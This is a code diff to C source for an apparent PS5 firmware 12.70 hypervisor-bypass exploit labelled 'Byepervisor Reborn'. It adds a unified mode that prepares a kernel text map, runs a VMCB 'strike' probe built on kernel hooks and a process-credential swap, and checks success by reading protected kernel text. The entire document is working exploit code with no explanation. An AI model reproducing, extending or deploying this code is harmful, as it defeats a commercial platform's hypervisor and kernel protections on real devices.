@@ -13,6 +13,14 @@
 #include "khook.h"
 #include "paging.h"
 #include "util.h"
+#ifdef AP_UNIFIED_1270
+#include "textmap_1270.h"
+#if !defined(AP_VMCB_STRIKE_1270) || \
+    (defined(FIXED_AP_PREP_ONLY_1270) && \
+     !defined(AP_UNIFIED_PREP_ONLY_1270))
+#error "The unified 12.70 path requires the VMCB strike"
+#endif
+#endif
 #ifdef AP_OWNED_RESUME_1270
 #include "carrier_1270.h"
 #endif
@@ -99,7 +107,11 @@
 #elif defined(AP_VMCB_STRIKE_1270)
 #define STUB_BYTES          224U
 #define STUB_QWORDS         28U
+#ifdef AP_UNIFIED_1270
+#define PROBE_STEM          "byepervisor-1270"
+#else
 #define PROBE_STEM          "fixed-ap-vmcb-strike"
+#endif
 #elif defined(AP_VMCB_SURVEY_1270)
 #define STUB_BYTES          170U
 #define STUB_QWORDS         22U
@@ -188,6 +200,9 @@ static char output_path[128];
 static uint8_t ap_stub[STUB_QWORDS * 8];
 static uint64_t carrier_pml4e_addr, carrier_pml4e_original;
 static int carrier_map_changed;
+#ifdef AP_UNIFIED_1270
+static int probe_cleanup_seen, probe_cleanup_status;
+#endif
 #ifdef AP_NPT_TABLE_DUMP_1270
 static uint8_t npt_dump_before[NPT_DUMP_BYTES];
 static uint8_t npt_dump_after[NPT_DUMP_BYTES];
@@ -535,7 +550,7 @@ static int cleanup(khook_t *hook, int armed, uint64_t cave,
 #ifdef AP_NPT_TABLE_DUMP_1270
   klog("AFP1270,1,npt-cleanup,restore=%d\n", npt_restore);
 #endif
-  return disarm == 0 && gate == 0 && head == 0 && big == 0 &&
+  int result = disarm == 0 && gate == 0 && head == 0 && big == 0 &&
          marker == 0 && carrier_map == 0 && auth == 0
 #ifdef AP_NPT_TABLE_DUMP_1270
          && npt_restore == 0
@@ -544,9 +559,18 @@ static int cleanup(khook_t *hook, int armed, uint64_t cave,
          && carrier == 0 && release == 0
 #endif
          ? 0 : -1;
+#ifdef AP_UNIFIED_1270
+  probe_cleanup_seen = 1;
+  probe_cleanup_status = result;
+#endif
+  return result;
 }
 
+#ifdef AP_UNIFIED_1270
+static int probe_main(void)
+#else
 int main(void)
+#endif
 {
   uint32_t fw = kernel_get_fw_version();
   if ((fw & 0xffff0000U) != FW_1270) {
@@ -760,9 +784,11 @@ int main(void)
     kernel_set_ucred_authid(getpid(), authid);
     return 6;
   }
+ #ifndef AP_UNIFIED_1270
   snprintf(output_path, sizeof(output_path),
            "/mnt/usb0/PS5-12.70-%s-%d-%ld-%ld.txt",
            PROBE_STEM, (int)getpid(), (long)stamp.tv_sec, (long)stamp.tv_nsec);
+ #endif
   char line[384];
   uint64_t carrier_first8 = 0;
   memcpy(&carrier_first8, carrier_before, 8);
@@ -798,7 +824,13 @@ int main(void)
            (uint64_t)NPT_TABLE_PA,
 #endif
            STUB_BYTES, STUB_QWORDS, store_chain.len);
-  if (save_line(line, 1) != 0) {
+  if (save_line(line,
+#ifdef AP_UNIFIED_1270
+                0
+#else
+                1
+#endif
+                ) != 0) {
     kernel_set_ucred_authid(getpid(), authid);
     klog("RSH1270,1,stop,stage=usb-create,path=%s\n", output_path);
     return 7;
@@ -1167,3 +1199,95 @@ int main(void)
 #endif
          ? 0 : 20;
 }
+
+#ifdef AP_UNIFIED_1270
+static int textmap_progress(const char *stage, unsigned count)
+{
+  char line[96];
+  snprintf(line, sizeof(line), "textmap,%s,count=%u\n", stage, count);
+  return save_line(line, 0);
+}
+
+int main(void)
+{
+  uint32_t fw = kernel_get_fw_version();
+  int soc = sceKernelGetMainSocId();
+  if ((fw & 0xffff0000U) != FW_1270 || soc != 0x840f60)
+    return 2;
+
+  struct timespec stamp = {0};
+  if (clock_gettime(CLOCK_REALTIME, &stamp) != 0)
+    return 3;
+  snprintf(output_path, sizeof(output_path),
+           "/mnt/usb0/PS5-12.70-%s-%d-%ld-%ld.txt",
+           PROBE_STEM, (int)getpid(), (long)stamp.tv_sec, (long)stamp.tv_nsec);
+  if (save_line("start,mode=unified,fw=12.70,soc=launch\n", 1) != 0)
+    return 4;
+
+  textmap_1270_status_t map = {0};
+  int prepared = textmap_1270_prepare(&map, textmap_progress);
+  if (prepared != 0) {
+    char line[96];
+    snprintf(line, sizeof(line), "stop,stage=textmap,result=%d\n", prepared);
+    save_line(line, 0);
+    if (prepared == -11)
+      notifyf("12.70 text-map rollback failed; reboot required");
+    return 5;
+  }
+
+  int probe = probe_main();
+  if (probe != 0) {
+    int restore = probe_cleanup_seen && probe_cleanup_status != 0 ?
+                  -3 : textmap_1270_restore();
+    char line[128];
+    snprintf(line, sizeof(line),
+             "stop,stage=ap-strike,result=%d,cleanup_seen=%d,"
+             "cleanup=%d,textmap_restore=%d\n",
+             probe, probe_cleanup_seen, probe_cleanup_status, restore);
+    save_line(line, 0);
+    if (restore != 0)
+      notifyf("12.70 strike cleanup uncertain; reboot required");
+    return 6;
+  }
+
+#ifdef AP_UNIFIED_PREP_ONLY_1270
+  int verified = textmap_1270_verify();
+  int restored = verified == (int)map.entries ?
+                 textmap_1270_restore() : -1;
+  char line[144];
+  snprintf(line, sizeof(line),
+           "end,prepare-only=1,text_entries=%u,verified=%d,"
+           "textmap_restore=%d\n", map.entries, verified, restored);
+  int saved = save_line(line, 0);
+  if (restored != 0)
+    notifyf("12.70 prepare cleanup failed; reboot required");
+  else if (saved == 0)
+    notifyf("Byepervisor Reborn 12.70\nPrepare-only check passed");
+  return restored == 0 && saved == 0 ? 0 : 7;
+#else
+  int verified = textmap_1270_verify();
+  uint64_t first = 0;
+  int text_read = verified == (int)map.entries ?
+                  kernel_copyout((intptr_t)KERNEL_ADDRESS_TEXT_BASE,
+                                 &first, sizeof(first)) : -1;
+  char line[160];
+  snprintf(line, sizeof(line),
+           "end,vmcbs=16,text_entries=%u,text_verified=%d,"
+           "text_read=%d,first8=0x%016" PRIx64 "\n",
+           map.entries, verified, text_read, first);
+  int saved = save_line(line, 0);
+  if (verified != (int)map.entries || text_read != 0 ||
+      first != UINT64_C(0x0000000058c55be8) || saved != 0) {
+    notifyf("12.70 text verification failed; reboot required");
+    return 7;
+  }
+  notifyf("Byepervisor Reborn 12.70\n"
+          "Kernel text readable: %02x %02x %02x %02x %02x %02x %02x %02x",
+          ((uint8_t *)&first)[0], ((uint8_t *)&first)[1],
+          ((uint8_t *)&first)[2], ((uint8_t *)&first)[3],
+          ((uint8_t *)&first)[4], ((uint8_t *)&first)[5],
+          ((uint8_t *)&first)[6], ((uint8_t *)&first)[7]);
+  return 0;
+#endif
+}
+#endif
